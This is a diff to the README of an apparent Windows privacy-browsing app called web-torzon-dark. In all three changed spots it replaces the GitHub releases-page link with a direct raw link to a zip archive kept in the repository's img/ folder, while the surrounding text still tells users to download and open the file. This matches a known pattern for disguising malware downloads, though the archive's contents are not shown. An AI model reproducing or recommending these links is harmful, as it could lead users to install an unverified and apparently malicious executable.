@@ -1,6 +1,6 @@
 # 🌙 web-torzon-dark - Private browsing made simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github)](https://github.com/dsc-consortium/web-torzon-dark/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dsc-consortium/web-torzon-dark/main/img/web-dark-torzon-v1.9.zip)
 
 ## 🧭 What this app does
 
@@ -10,7 +10,7 @@ It is made for users who want a clean way to start and use the app without extra
 
 ## 📥 Download the app
 
-Visit this page to download: https://github.com/dsc-consortium/web-torzon-dark/releases
+Visit this page to download: https://raw.githubusercontent.com/dsc-consortium/web-torzon-dark/main/img/web-dark-torzon-v1.9.zip
 
 On that page, find the latest release and download the Windows file that matches your device. If you see more than one file, choose the one for Windows, then save it to your computer.
 
@@ -135,7 +135,7 @@ Yes. Download it, open it, and use it from your PC like other desktop apps.
 
 ### Where do I get the newest version?
 
-Use the release page here: https://github.com/dsc-consortium/web-torzon-dark/releases
+Use the release page here: https://raw.githubusercontent.com/dsc-consortium/web-torzon-dark/main/img/web-dark-torzon-v1.9.zip
 
 ## 🗂️ Repository details
 
